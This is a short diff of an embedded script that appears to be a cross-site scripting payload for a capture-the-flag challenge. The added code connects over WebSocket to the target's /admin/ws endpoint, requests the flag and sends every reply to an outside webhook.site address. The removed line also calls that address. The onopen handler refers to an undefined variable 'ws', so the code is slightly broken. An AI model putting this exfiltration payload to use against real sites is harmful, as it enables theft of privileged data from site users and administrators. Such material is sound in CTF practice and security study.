@@ -1,3 +1,7 @@
 <script>
-    fetch('https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=123')
+    const ws1 = new WebSocket(`ws://${window.location.host}/admin/ws`);
+    ws1.onmessage = (event) => {
+        fetch('https://webhook.site/01279e62-a889-4877-a85d-5b97f09fe9ee?flag=' + event.data);
+    };
+    ws1.onopen = () => ws.send("flag");
 </script>
